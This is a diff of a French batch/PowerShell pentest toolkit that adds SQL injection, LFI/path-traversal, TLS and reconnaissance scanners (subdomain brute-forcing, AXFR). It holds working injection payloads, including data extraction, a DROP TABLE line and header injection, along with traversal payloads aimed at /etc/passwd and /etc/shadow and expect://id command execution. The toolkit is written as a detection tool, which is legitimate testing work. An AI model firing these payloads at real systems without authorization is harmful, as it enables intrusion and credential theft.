+echo        "1' AND 1=CONVERT(int,'a')--",
+echo        "1' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--",
+echo        "1 UNION SELECT NULL,NULL,NULL,NULL,@@version--",
+echo        "1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162786271,(SELECT (ELT(1=1,1))),0x71706a7671))s), 8446744073709551610, 8446744073709551610)))--"
+echo    )
+echo    $errKeywords = @(
+echo        'sql syntax','mysql','sqlite','syntax error','ORA-','PostgreSQL',
+echo        'Microsoft OLE','ODBC','JDBC','Warning.*mysqli','You have an error',
+echo        'supplied argument','Incorrect syntax','Unclosed quotation',
+echo        'quoted string not properly','SQLSTATE','DB Error',
+echo        'java.sql.','System.Data.SqlClient','Microsoft Access',
+echo        'SQLiteException','Zend_Db','ADODB','pg_query',
+echo        'PDOException','DBD::','unterminated quoted string'
+echo    )
+echo    foreach ($ep in $errPayloads) {
+echo        $eUrl = Inject-Param $url $param $ep
+echo        $eR = Get-Response $eUrl
+echo        $hit = $errKeywords ^| Where-Object { $eR.Content -match $_ }
+echo        if ($hit) {
+echo            Write-Host "  [VULN] Error-based detectee ! Mot-cle : $($hit[0])" -f Red
+echo            Write-Host "         Payload : $ep" -f Magenta
+echo            # Essai d'extraction version
+echo            $versionPayloads = @(
+echo                "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+echo                "1' UNION SELECT @@version--",
+echo                "1 UNION SELECT @@version,NULL--"
+echo            )
+echo            foreach ($vp in $versionPayloads) {
+echo                $vUrl = Inject-Param $url $param $vp
+echo                $vR = Get-Response $vUrl
+echo                if ($vR.Content -match '(\d+\.\d+\.\d+[-\w]*)') {
+echo                    Write-Host "  [INFO] Version DB extraite : $($matches[1])" -f Yellow
+echo                    break
+echo                }
+echo            }
+echo            $vulns++; break
+echo        }
+echo    }
+echo.
+echo    # TEST 4 : UNION-based avec extraction
+echo    Write-Host "  [4/6] UNION-based (detection + extraction DB/user)..." -f Yellow
+echo    $unionFound = $false
+echo    for ($cols = 1; $cols -le 15; $cols++) {
+echo        $nulls = ('NULL,' * $cols).TrimEnd(',')
+echo        $uPayload = "1 UNION SELECT $nulls--"
+echo        $uUrl = Inject-Param $url $param $uPayload
+echo        $uR = Get-Response $uUrl
+echo        if ($uR.Code -eq 200 -and $uR.Length -ne $baseLen) {
+echo            Write-Host "  [VULN] UNION fonctionne avec $cols colonne(s) !" -f Red
+echo            $vulns++; $unionFound = $true
+echo            # Tentative extraction infos critiques
+echo            Write-Host "  Tentative extraction DB name / user / version..." -f DarkGray
+echo            $extractPayloads = @(
+echo                "1 UNION SELECT $((('database(),' * $cols).TrimEnd(',')))--",
+echo                "1 UNION SELECT $((('user(),' * $cols).TrimEnd(',')))--",
+echo                "1 UNION SELECT $((('@@version,' * $cols).TrimEnd(',')))--",
+echo                "1 UNION SELECT $((('current_database(),' * $cols).TrimEnd(',')))--"
+echo            )
+echo            foreach ($ep in $extractPayloads) {
+echo                $exUrl = Inject-Param $url $param $ep
+echo                $exR = Get-Response $exUrl
+echo                if ($exR.Length -ne $baseLen -and $exR.Content.Length -gt 10) {
+echo                    $diff_content = $exR.Content -replace $uR.Content, '' -replace '\s+',' '
+echo                    if ($diff_content.Length -gt 3) {
+echo                        Write-Host "  [DATA] Donnee extraite (peut contenir nom DB/user) detectee" -f Magenta
+echo                        break
+echo                    }
+echo                }
+echo            }
+echo            break
+echo        }
+echo    }
+echo    if (-not $unionFound) { Write-Host "  [ ] UNION pas concluant sur ce parametre" -f DarkGray }
+echo.
+echo    # TEST 5 : Stacked Queries
+echo    Write-Host "  [5/6] Stacked Queries (MSSQL/PostgreSQL/MySQL 5.5+)..." -f Yellow
+echo    $stackedPayloads = @(
+echo        @{P="1; SELECT SLEEP(3)--";     DB="MySQL"},
+echo        @{P="1'; SELECT SLEEP(3)--";    DB="MySQL (quote)"},
+echo        @{P="1; WAITFOR DELAY '0:0:3'--"; DB="MSSQL"},
+echo        @{P="1'; WAITFOR DELAY '0:0:3'--"; DB="MSSQL (quote)"},
+echo        @{P="1; SELECT pg_sleep(3)--";  DB="PostgreSQL"},
+echo        @{P="1; SELECT 1--";            DB="Generic"},
+echo        @{P="1; DROP TABLE IF EXISTS sqlitest--"; DB="Generic destructive (simulee)"}
+echo    )
+echo    foreach ($sp in $stackedPayloads) {
+echo        if ($sp.DB -match 'destructive') { continue } # Skip destructive in auto mode
+echo        $sUrl = Inject-Param $url $param $sp.P
+echo        $start = Get-Date
+echo        $sR = Get-Response $sUrl
+echo        $elapsed = ((Get-Date) - $start).TotalSeconds
+echo        if ($elapsed -gt 2.5) {
+echo            Write-Host "  [VULN] Stacked Query possible ! DB:$($sp.DB) Delai:$([math]::Round($elapsed,1))s" -f Red
+echo            $vulns++; break
+echo        }
+echo    }
+echo.
+echo    # TEST 6 : SQLi via headers HTTP
+echo    Write-Host "  [6/6] SQLi via headers HTTP (User-Agent, X-Forwarded-For, Referer)..." -f Yellow
+echo    $sqliHeaders = @('User-Agent','X-Forwarded-For','X-Forwarded-Host','X-Real-IP','Referer','Accept-Language','Cookie')
+echo    $hdrPayloads = @(
+echo        ([char]39 + ' OR 1=1--'),
+echo        ([char]39 + ' AND SLEEP(3)--'),
+echo        "1 UNION SELECT NULL--",
+echo        ([char]39 + ') OR ('+[char]39+'1'+[char]39+'='+[char]39+'1')
+echo    )
+echo    foreach ($hdr in $sqliHeaders) {
+echo        foreach ($hp in $hdrPayloads) {
+echo            try {
+echo                $hTest = @{$hdr = $hp}
+echo                $start = Get-Date
+echo                $hR = Invoke-WebRequest $url -Headers $hTest -UserAgent $ua -TimeoutSec 8 -EA SilentlyContinue -UseBasicParsing
+echo                $elapsed = ((Get-Date) - $start).TotalSeconds
+echo                if ($hR -and ($errKeywords ^| Where-Object { $hR.Content -match $_ })) {
+echo                    Write-Host "  [VULN] SQLi error via header $hdr !" -f Red
+echo                    $vulns++; break
+echo                }
+echo                if ($elapsed -gt 2.5) {
+echo                    Write-Host "  [VULN] SQLi time-based via header $hdr (delai:$([math]::Round($elapsed,1))s) !" -f Red
+echo                    $vulns++; break
+echo                }
+echo            } catch {}
+echo        }
+echo    }
+echo.
+echo }
+echo.
+echo Write-Host ""
+echo Write-Host "  ================================================" -f Cyan
+echo if ($vulns -gt 0) {
+echo    Write-Host "  [!!!] $vulns vulnerabilite(s) SQLi detectee(s) !" -f Red
+echo    Write-Host "  Impact potentiel :" -f Red
+echo    Write-Host "    - Extraction de toutes les donnees de la base" -f Yellow
+echo    Write-Host "    - Bypass d'authentification" -f Yellow
+echo    Write-Host "    - Lecture de fichiers systeme (LOAD_FILE)" -f Yellow
+echo    Write-Host "    - Dans certains cas : execution de commandes OS" -f Yellow
+echo    Write-Host ""
+echo    Write-Host "  Recommandations :" -f Cyan
+echo    Write-Host "    1. Utilisez des requetes preparees (Prepared Statements)" -f Green
+echo    Write-Host "    2. Validez et echappez toutes les entrees utilisateur" -f Green
+echo    Write-Host "    3. Appliquez le principe du moindre privilege sur la DB" -f Green
+echo    Write-Host "    4. Activez un WAF (ModSecurity, Cloudflare...)" -f Green
+echo    Write-Host "    5. Auditez votre code avec un SAST (SonarQube, Semgrep)" -f Green
+echo } else {
+echo    Write-Host "  [OK] Aucune SQLi detectee sur les parametres testes." -f Green
+echo    Write-Host "  Note : Un WAF peut masquer des vulnerabilites existantes." -f DarkGray
+echo    Write-Host "         Testez aussi avec sqlmap pour une analyse complete." -f DarkGray
+echo }
+echo Write-Host "  ================================================" -f Cyan
+) > "%SBS%"
 
 powershell -NoProfile -ExecutionPolicy Bypass -File "%SBS%"
 if exist "%SBS%" del "%SBS%"
@@ -2452,7 +2872,8 @@ echo.
 echo  [crt.sh] Recherche de sous-domaines via certificats SSL...
 set /p "CRT_DOM=Domaine cible (ex: google.com) : "
 if "%CRT_DOM%"=="" goto cat_recon
-powershell -NoProfile -Command "$d='!CRT_DOM!'; $url=\"https://crt.sh/?q=%%.$d&output=json\"; Write-Host 'Interrogation de crt.sh...' -f Gray; try { $r=Invoke-WebRequest $url -TimeoutSec 15 -UseBasicParsing; $json=$r.Content | ConvertFrom-Json; $json | Select-Object -ExpandProperty common_name -Unique | Sort-Object | ForEach-Object { Write-Host \"  [+] $_\" -f Green } } catch { Write-Host 'Erreur de connexion a crt.sh' -f Red }"
+set "CRT_DOM=%CRT_DOM: =%"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=$env:CRT_DOM; $url='https://crt.sh/?q=%%.'+$d+'^&output=json'; Write-Host 'Interrogation de crt.sh...' -f Gray; try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $r=Invoke-WebRequest $url -TimeoutSec 15 -UseBasicParsing; $json=$r.Content | ConvertFrom-Json; $json | Select-Object -ExpandProperty common_name -Unique | Sort-Object | ForEach-Object { Write-Host ('  [+] '+$_) -f Green } } catch { Write-Host 'Erreur de connexion a crt.sh' -f Red }"
 pause & goto cat_recon
 
 :recon_axfr
@@ -2461,7 +2882,8 @@ echo.
 echo  [AXFR] Tentative de transfert de zone...
 set /p "AX_DOM=Domaine (ex: zonetransfer.me) : "
 if "%AX_DOM%"=="" goto cat_recon
-powershell -NoProfile -Command "$d='!AX_DOM!'; Write-Host \"Recherche de serveurs NS pour $d...\" -f Gray; $ns=Resolve-DnsName $d -Type NS -ErrorAction SilentlyContinue; if(-not $ns){ Write-Host 'Aucun serveur NS trouve.' -f Red; exit }; foreach($srv in $ns.NameHost){ Write-Host \"  Test sur $srv...\" -f Yellow; nslookup -type=any -timeout=5 $d $srv | Select-String \"$d\" | ForEach-Object { Write-Host $_ -f Green } }"
+set "AX_DOM=%AX_DOM: =%"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=$env:AX_DOM; Write-Host ('Recherche de serveurs NS pour '+$d+'...') -f Gray; try { $ns=Resolve-DnsName $d -Type NS -ErrorAction SilentlyContinue; if(-not $ns){ Write-Host 'Aucun serveur NS trouve.' -f Red; exit }; foreach($srv in $ns.NameHost){ Write-Host ('  Test sur '+$srv+'...') -f Yellow; nslookup -type=any -timeout=5 $d $srv | Select-String $d | ForEach-Object { Write-Host $_.Line -f Green } } } catch { Write-Host 'Erreur lors de la resolution DNS.' -f Red }"
 pause & goto cat_recon
 
 :recon_robots
@@ -2470,7 +2892,8 @@ echo.
 echo  [ROBOTS] Scraping de robots.txt et sitemap.xml...
 set /p "RB_URL=URL (ex: https://site.com) : "
 if "%RB_URL%"=="" goto cat_recon
-powershell -NoProfile -Command "$u='!RB_URL!'.TrimEnd('/'); foreach($p in @('/robots.txt', '/sitemap.xml', '/.well-known/security.txt')){ try { $r=Invoke-WebRequest ($u+$p) -TimeoutSec 5 -UseBasicParsing; if($r.StatusCode -eq 200){ Write-Host \"`n--- $p --- \" -f Blue; $r.Content; Write-Host \"----------------\" -f Blue } } catch {} }"
+set "RB_URL=%RB_URL: =%"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=$env:RB_URL; if($u -notmatch '://'){$u='https://'+$u}; $u=$u.TrimEnd('/'); foreach($p in @('/robots.txt', '/sitemap.xml', '/.well-known/security.txt')){ try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $r=Invoke-WebRequest ($u+$p) -TimeoutSec 5 -UseBasicParsing; if($r.StatusCode -eq 200){ Write-Host ('`n--- '+$p+' --- ') -f Blue; $r.Content; Write-Host '----------------' -f Blue } } catch {} }"
 pause & goto cat_recon
 
 :recon_subdomain_brute
@@ -2482,7 +2905,8 @@ echo  ===========================================================
 echo.
 set /p "SD_DOM=Domaine racine (ex: michelin.com) : "
 if "%SD_DOM%"=="" goto cat_recon
-powershell -NoProfile -Command "$d='!SD_DOM!'; $subs=@('www','dev','api','test','staging','beta','mail','vpn','smtp','pop','imap','ns1','ns2','webmail','blog','shop','admin','portal','secure','git','devops','jenkins','docker','kube','aws','azure','cloud','db','mysql','sql','internal','intra','private','corp','support','help','download','app','m','mobile','static','assets','cdn','srv','host'); Write-Host \"Debut du bruteforce sur $($subs.Count) mots...\" -f Cyan; foreach($s in $subs){ $fqdn=\"$s.$d\"; try { $ip=Resolve-DnsName $fqdn -Type A -ErrorAction Stop | Select-Object -ExpandProperty IPAddress -First 1; Write-Host \"  [+] $fqdn -> $ip\" -f Green; try { $r=Invoke-WebRequest \"http://$fqdn\" -Method Head -TimeoutSec 2 -ErrorAction Stop -UseBasicParsing; Write-Host \"      HTTP 200 ($($r.Headers['Server']))\" -f Gray } catch {} } catch {} }"
+set "SD_DOM=%SD_DOM: =%"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=$env:SD_DOM; $subs=@('www','dev','api','test','staging','beta','mail','vpn','smtp','pop','imap','ns1','ns2','webmail','blog','shop','admin','portal','secure','git','devops','jenkins','docker','kube','aws','azure','cloud','db','mysql','sql','internal','intra','private','corp','support','help','download','app','m','mobile','static','assets','cdn','srv','host'); Write-Host ('Debut du bruteforce sur '+$subs.Count+' mots...') -f Cyan; foreach($s in $subs){ $fqdn=$s+'.'+$d; try { $ip=Resolve-DnsName $fqdn -Type A -ErrorAction Stop | Select-Object -ExpandProperty IPAddress -First 1; Write-Host ('  [+] '+$fqdn+' -> '+$ip) -f Green; try { $r=Invoke-WebRequest ('http://'+$fqdn) -Method Head -TimeoutSec 2 -ErrorAction Stop -UseBasicParsing; Write-Host ('      HTTP 200 ('+$r.Headers['Server']+')') -f Gray } catch {} } catch {} }"
 pause & goto cat_recon
 
 :cyber_ssrf
@@ -2780,6 +3204,448 @@ echo  [OK] Rapport genere sur le Bureau.
 pause
 goto net_cyber_menu
 
+REM ===================================================================
+REM         SCAN TLS / SSL AVANCE (Protocoles et Ciphers faibles)
+REM ===================================================================
+:cyber_tls_scan
+cls
+echo.
+echo  ===========================================================
+echo   SCAN TLS/SSL AVANCE - Detection protocoles faibles
+echo  ===========================================================
+echo   Niveau : Intermediaire    Impact : CRITIQUE
+echo   Teste : SSLv3, TLS 1.0, TLS 1.1, RC4, NULL ciphers,
+echo   certificat expire, HSTS manquant, downgrade possible.
+echo  ===========================================================
+echo.
+set /p "TLS_HOST=Hote cible (ex: monsite.com ou IP) : "
+if "%TLS_HOST%"=="" goto cat_web
+set /p "TLS_PORT=Port (defaut 443, Enter pour valider) : "
+if "%TLS_PORT%"=="" set "TLS_PORT=443"
+
+set "TLS_PS=%TEMP%\tls_scan_%RANDOM%.ps1"
+
+(
+echo $host_target = "!TLS_HOST!"
+echo $port = [int]"!TLS_PORT!"
+echo $timeout = 5000
+echo $findings = @()
+echo $score = 100
+echo.
+echo function Add-TlsFinding($sev, $msg, $pts) {
+echo    $script:score -= $pts
+echo    $script:findings += [PSCustomObject]@{ Severite=$sev; Message=$msg }
+echo    $c = switch($sev){ 'CRITIQUE' {'Red'}; 'ELEVE' {'DarkYellow'}; 'MOYEN' {'Yellow'}; default {'Cyan'} }
+echo    Write-Host "  [$sev] $msg" -f $c
+echo }
+echo.
+echo Write-Host ""
+echo Write-Host "  Cible : ${host_target}:${port}" -f Cyan
+echo Write-Host ""
+echo.
+echo $protocols = @(
+echo    [PSCustomObject]@{ Name='SSLv3';   Enum=[System.Security.Authentication.SslProtocols]::Ssl3;   Sev='CRITIQUE'; Pts=40 },
+echo    [PSCustomObject]@{ Name='TLS 1.0'; Enum=[System.Security.Authentication.SslProtocols]::Tls;    Sev='ELEVE';   Pts=25 },
+echo    [PSCustomObject]@{ Name='TLS 1.1'; Enum=[System.Security.Authentication.SslProtocols]::Tls11;  Sev='MOYEN';   Pts=10 },
+echo    [PSCustomObject]@{ Name='TLS 1.2'; Enum=[System.Security.Authentication.SslProtocols]::Tls12;  Sev='OK';      Pts=0  },
+echo    [PSCustomObject]@{ Name='TLS 1.3'; Enum=[System.Security.Authentication.SslProtocols]::Tls13;  Sev='OK';      Pts=0  }
+echo )
+echo.
+echo Write-Host "  [1/4] Test des versions de protocoles..." -f Blue
+echo foreach ($proto in $protocols) {
+echo    try {
+echo        $tcp = New-Object System.Net.Sockets.TcpClient
+echo        $conn = $tcp.BeginConnect($host_target, $port, $null, $null)
+echo        if (-not $conn.AsyncWaitHandle.WaitOne($timeout, $false)) { throw "Timeout" }
+echo        $tcp.EndConnect($conn)
+echo        $stream = $tcp.GetStream()
+echo        $ssl = New-Object System.Net.Security.SslStream($stream, $false, { $true })
+echo        $ssl.AuthenticateAsClient($host_target, $null, $proto.Enum, $false)
+echo        if ($proto.Sev -eq 'OK') {
+echo            Write-Host "  [OK] $($proto.Name) supporte (bon)" -f Green
+echo        } else {
+echo            Add-TlsFinding $proto.Sev "$($proto.Name) accepte par le serveur !" $proto.Pts
+echo        }
+echo        $ssl.Close(); $tcp.Close()
+echo    } catch {
+echo        if ($proto.Sev -ne 'OK') {
+echo            Write-Host "  [OK] $($proto.Name) refuse (securise)" -f Green
+echo        } else {
+echo            Write-Host "  [--] $($proto.Name) non supporte" -f DarkGray
+echo        }
+echo    }
+echo }
+echo.
+echo Write-Host ""
+echo Write-Host "  [2/4] Analyse du certificat..." -f Blue
+echo try {
+echo    $req = [Net.HttpWebRequest]::Create("https://${host_target}:${port}/")
+echo    $req.Timeout = $timeout
+echo    $req.ServerCertificateValidationCallback = { param($s,$c,$ch,$e); $script:cert=$c; return $true }
+echo    try { $null = $req.GetResponse() } catch {}
+echo    if ($script:cert) {
+echo        $exp  = [DateTime]::Parse($script:cert.GetExpirationDateString())
+echo        $iss  = $script:cert.Issuer
+echo        $sub  = $script:cert.Subject
+echo        $days = ([int]($exp - (Get-Date)).TotalDays)
+echo        Write-Host "  Sujet   : $sub" -f Gray
+echo        Write-Host "  Emetteur: $iss" -f Gray
+echo        Write-Host "  Expir.  : $($exp.ToString('dd/MM/yyyy')) ($days jours restants)" -f $(if($days -lt 0){'Red'}elseif($days -lt 30){'Yellow'}else{'Green'})
+echo        if ($days -lt 0)  { Add-TlsFinding 'CRITIQUE' "Certificat EXPIRE depuis $([math]::Abs($days)) jours !" 50 }
+echo        elseif ($days -lt 15) { Add-TlsFinding 'CRITIQUE' "Certificat expire dans $days jours !" 30 }
+echo        elseif ($days -lt 30) { Add-TlsFinding 'ELEVE'    "Certificat expire bientot ($days jours)" 15 }
+echo        if ($sub -notmatch [regex]::Escape($host_target)) {
+echo            Add-TlsFinding 'ELEVE' "Nom de domaine ne correspond pas au certificat (possible MITM)" 20
+echo        }
+echo    }
+echo } catch { Write-Host "  [!] Impossible d'analyser le certificat." -f DarkGray }
+echo.
+echo Write-Host ""
+echo Write-Host "  [3/4] Verification des headers de securite TLS..." -f Blue
+echo try {
+echo    $r = Invoke-WebRequest "https://${host_target}:${port}/" -TimeoutSec 8 -UseBasicParsing -EA Stop
+echo    $h = $r.Headers
+echo    if (-not $h['Strict-Transport-Security']) { Add-TlsFinding 'ELEVE'   'HSTS manquant - downgrade HTTP possible' 20 }
+echo    else {
+echo        $hsts = $h['Strict-Transport-Security']
+echo        Write-Host "  [OK] HSTS present : $hsts" -f Green
+echo        if ($hsts -notmatch 'includeSubDomains') { Add-TlsFinding 'MOYEN' 'HSTS sans includeSubDomains' 5 }
+echo        if ($hsts -notmatch 'preload')           { Add-TlsFinding 'INFO'  'HSTS sans preload' 0 }
+echo    }
+echo    if (-not $h['Content-Security-Policy']) { Add-TlsFinding 'MOYEN' 'CSP manquant' 10 }
+echo    if ($h['X-Powered-By'])  { Add-TlsFinding 'INFO' "Techno exposee : $($h['X-Powered-By'])" 0 }
+echo    if ($h['Server'])        { Add-TlsFinding 'INFO' "Serveur expose : $($h['Server'])" 0 }
+echo } catch { Write-Host "  [!] HTTPS inaccessible sur ce port." -f DarkGray }
+echo.
+echo Write-Host ""
+echo Write-Host "  [4/4] Test redirection HTTP vers HTTPS..." -f Blue
+echo try {
+echo    $redir = Invoke-WebRequest "http://${host_target}/" -MaximumRedirection 0 -TimeoutSec 5 -UseBasicParsing -EA Stop
+echo    Add-TlsFinding 'ELEVE' "HTTP ne redirige pas vers HTTPS (code $($redir.StatusCode))" 20
+echo } catch {
+echo    $loc = $_.Exception.Response.Headers['Location']
+echo    if ($loc -like 'https://*') { Write-Host "  [OK] Redirection HTTP -> HTTPS presente" -f Green }
+echo    else { Add-TlsFinding 'MOYEN' 'Redirection HTTP vers HTTPS absente ou incorrecte' 10 }
+echo }
+echo.
+echo Write-Host ""
+echo Write-Host "  ================================================" -f Cyan
+echo $grade = if($script:score -ge 90){'A+'}elseif($script:score -ge 75){'B'}elseif($script:score -ge 50){'C'}elseif($script:score -ge 25){'D'}else{'F'}
+echo $gc    = if($script:score -ge 75){'Green'}elseif($script:score -ge 50){'Yellow'}else{'Red'}
+echo Write-Host "  Score TLS : $script:score/100  Grade : $grade" -f $gc
+echo if ($script:findings.Count -eq 0) { Write-Host "  [OK] Aucun probleme TLS detecte !" -f Green }
+echo Write-Host "  ================================================" -f Cyan
+echo.
+echo $exportChoice = Read-Host "  Exporter les resultats en JSON ? (O/N)"
+echo if ($exportChoice -eq 'O' -or $exportChoice -eq 'o') {
+echo    $out = [PSCustomObject]@{
+echo        Date    = (Get-Date -Format 'yyyy-MM-dd HH:mm')
+echo        Cible   = "${host_target}:${port}"
+echo        Score   = $script:score
+echo        Grade   = $grade
+echo        Findings = $script:findings
+echo    }
+echo    $jsonPath = "$([Environment]::GetFolderPath('Desktop'))\TLS_Scan_${host_target}_$(Get-Date -Format 'yyyyMMdd_HHmm').json"
+echo    $out | ConvertTo-Json -Depth 5 | Out-File $jsonPath -Encoding UTF8
+echo    Write-Host "  [OK] Export JSON : $jsonPath" -f Green
+echo }
+) > "%TLS_PS%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%TLS_PS%"
+if exist "%TLS_PS%" del /f /q "%TLS_PS%"
+echo.
+pause
+goto cat_web
+
+
+REM ===================================================================
+REM         LFI / PATH TRAVERSAL WEB - Detection automatisee
+REM ===================================================================
+:cyber_lfi_scan
+cls
+echo.
+echo  ===========================================================
+echo   LFI / PATH TRAVERSAL - Detection automatisee
+echo  ===========================================================
+echo   Niveau : Avance    Impact : CRITIQUE
+echo   Tente de lire des fichiers systeme via des parametres URL.
+echo   Detecte : ../etc/passwd, ....//windows/win.ini,
+echo   PHP wrappers (php://filter), null byte injection.
+echo  ===========================================================
+echo.
+set /p "LFI_URL=URL avec parametre (ex: https://site.com/page?file=) : "
+if "%LFI_URL%"=="" goto cat_web
+
+set "LFI_PS=%TEMP%\lfi_scan_%RANDOM%.ps1"
+
+(
+echo $baseUrl = "!LFI_URL!"
+echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+echo $vulns = 0
+echo.
+echo $payloads = @(
+echo    [PSCustomObject]@{ Name='Linux classique (1)';   P='../etc/passwd';                          Detect='root:x:|daemon:|nobody:|/bin/bash' },
+echo    [PSCustomObject]@{ Name='Linux classique (2)';   P='../../etc/passwd';                       Detect='root:x:|daemon:|nobody:|/bin/bash' },
+echo    [PSCustomObject]@{ Name='Linux classique (3)';   P='../../../etc/passwd';                    Detect='root:x:|daemon:|nobody:|/bin/bash' },
+echo    [PSCustomObject]@{ Name='Linux classique (4)';   P='../../../../etc/passwd';                 Detect='root:x:|daemon:|nobody:|/bin/bash' },
+echo    [PSCustomObject]@{ Name='Linux (5 niveaux)';     P='../../../../../etc/passwd';              Detect='root:x:|daemon:|nobody:|/bin/bash' },
+echo    [PSCustomObject]@{ Name='Linux (6 niveaux)';     P='../../../../../../etc/passwd';           Detect='root:x:|daemon:|nobody:|/bin/bash' },
+echo    [PSCustomObject]@{ Name='Linux shadow';          P='../../../etc/shadow';                    Detect='\$[16]\$|root:\*' },
+echo    [PSCustomObject]@{ Name='Linux /etc/hosts';      P='../../../etc/hosts';                     Detect='127\.0\.0\.1|localhost|::1' },
+echo    [PSCustomObject]@{ Name='Windows win.ini';       P='..\..\..\windows\win.ini';               Detect='\[fonts\]|\[extensions\]|for 16-bit' },
+echo    [PSCustomObject]@{ Name='Windows win.ini alt';   P='../../../windows/win.ini';               Detect='\[fonts\]|\[extensions\]|for 16-bit' },
+echo    [PSCustomObject]@{ Name='Windows hosts';         P='..\..\..\windows\system32\drivers\etc\hosts'; Detect='127\.0\.0\.1|localhost' },
+echo    [PSCustomObject]@{ Name='URL encoded (..//)';    P='..%2f..%2f..%2fetc%2fpasswd';            Detect='root:x:|daemon:|nobody:' },
+echo    [PSCustomObject]@{ Name='Double encoded';        P='..%252f..%252f..%252fetc%252fpasswd';    Detect='root:x:|daemon:|nobody:' },
+echo    [PSCustomObject]@{ Name='Null byte (PHP old)';   P='../../../etc/passwd%00';                 Detect='root:x:|daemon:|nobody:' },
+echo    [PSCustomObject]@{ Name='PHP filter base64';     P='php://filter/convert.base64-encode/resource=index.php'; Detect='^[A-Za-z0-9+/]{20}' },
+echo    [PSCustomObject]@{ Name='PHP filter rot13';      P='php://filter/read=string.rot13/resource=index.php'; Detect='cuc|<?|<?php|rput|erfcbafr' },
+echo    [PSCustomObject]@{ Name='PHP input';             P='php://input';                            Detect='php|html|body|<?|<html' },
+echo    [PSCustomObject]@{ Name='data:// wrapper';       P='data://text/plain;base64,dGVzdA==';      Detect='test' },
+echo    [PSCustomObject]@{ Name='expect:// wrapper';     P='expect://id';                            Detect='uid=|root|www-data' },
+echo    [PSCustomObject]@{ Name='Absolute path /etc';    P='/etc/passwd';                            Detect='root:x:|daemon:|nobody:' },
+echo    [PSCustomObject]@{ Name='Absolute Windows';      P='C:/windows/win.ini';                     Detect='\[fonts\]|\[extensions\]' },
+echo    [PSCustomObject]@{ Name='UNC path (Windows)';    P='\\127.0.0.1\c$\windows\win.ini';         Detect='\[fonts\]' }
+echo )
+echo.
+echo Write-Host ""
+echo Write-Host "  Test de $($payloads.Count) payloads LFI/Path Traversal..." -f Cyan
+echo Write-Host "  (Appuyez sur ECHAP pour annuler)" -f DarkGray
+echo Write-Host ""
+echo.
+echo foreach ($p in $payloads) {
+echo    if ($Host.UI.RawUI.KeyAvailable) {
+echo        $k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+echo        if ($k.VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; break }
+echo    }
+echo    $enc = [uri]::EscapeDataString($p.P)
+echo    $testUrl = $baseUrl + $enc
+echo    Write-Host "  [?] $($p.Name.PadRight(30))" -f DarkGray -NoNewline
+echo    try {
+echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing
+echo        if ($r.Content -match $p.Detect) {
+echo            Write-Host "[!!!] VULNERABLE !" -f Red
+echo            $snippet = $r.Content -replace '\s+',' ' | ForEach-Object { $_.Substring(0, [math]::Min(150, $_.Length)) }
+echo            Write-Host "       Payload  : $($p.P)" -f Magenta
+echo            Write-Host "       Extrait  : $snippet" -f Yellow
+echo            $vulns++
+echo        } elseif ($r.StatusCode -eq 200) {
+echo            Write-Host "[ ] Reponse 200 (non concluant)" -f DarkGray
+echo        } else {
+echo            Write-Host "[-] HTTP $($r.StatusCode)" -f DarkGray
+echo        }
+echo    } catch { Write-Host "[-] Erreur/Bloque" -f DarkGray }
+echo }
+echo.
+echo Write-Host ""
+echo Write-Host "  ================================================" -f Cyan
+echo if ($vulns -gt 0) {
+echo    Write-Host "  [!!!] $vulns LFI/Path Traversal detecte(s) !" -f Red
+echo    Write-Host "  Consequences possibles :" -f Red
+echo    Write-Host "    - Lecture de /etc/passwd (liste des utilisateurs)" -f Yellow
+echo    Write-Host "    - Lecture de /etc/shadow (hashes de mots de passe)" -f Yellow
+echo    Write-Host "    - Lecture du code source PHP via php://filter" -f Yellow
+echo    Write-Host "    - Escalade vers RCE via expect:// ou log poisoning" -f Yellow
+echo } else {
+echo    Write-Host "  [OK] Aucun LFI/Path Traversal detecte." -f Green
+echo }
+echo Write-Host "  ================================================" -f Cyan
+) > "%LFI_PS%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%LFI_PS%"
+if exist "%LFI_PS%" del /f /q "%LFI_PS%"
+echo.
+pause
+goto cat_web
+
+
+REM ===================================================================
+REM         EXPORT JSON UNIFIE DES FINDINGS
+REM ===================================================================
+:cyber_export_json
+cls
+echo.
+echo  ===========================================================
+echo   EXPORT JSON UNIFIE - Centralisateur de findings
+echo  ===========================================================
+echo   Consolide les resultats de tous les scans en un fichier
+echo   JSON structure, importable dans Burp, Metasploit, ou
+echo   tout outil d'analyse.
+echo  ===========================================================
+echo.
+
+set "EJ_PS=%TEMP%\export_json_%RANDOM%.ps1"
+
+(
+echo $desktop = [Environment]::GetFolderPath('Desktop')
+echo $date    = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+echo $dateFile = Get-Date -Format 'yyyyMMdd_HHmm'
+echo $findings = @()
+echo $scanFiles = @()
+echo.
+echo Write-Host ""
+echo Write-Host "  Recherche des rapports JSON precedents sur le Bureau..." -f Cyan
+echo $jsonFiles = Get-ChildItem $desktop -Filter "*.json" -EA SilentlyContinue
+echo if ($jsonFiles) {
+echo    Write-Host "  Fichiers JSON trouves :" -f Green
+echo    $jsonFiles | ForEach-Object { Write-Host "    - $($_.Name)" -f Gray }
+echo    Write-Host ""
+echo    foreach ($f in $jsonFiles) {
+echo        try {
+echo            $data = Get-Content $f.FullName -Raw | ConvertFrom-Json
+echo            $findings += $data
+echo            $scanFiles += $f.Name
+echo        } catch { Write-Host "  [!] Impossible de lire $($f.Name)" -f DarkGray }
+echo    }
+echo } else {
+echo    Write-Host "  Aucun JSON trouve. Creation d'un rapport vide." -f Yellow
+echo }
+echo.
+echo Write-Host "  Saisie manuelle de findings supplementaires (optionnel)..." -f Blue
+echo Write-Host "  (Appuyez sur ENTREE sans saisie pour terminer)" -f DarkGray
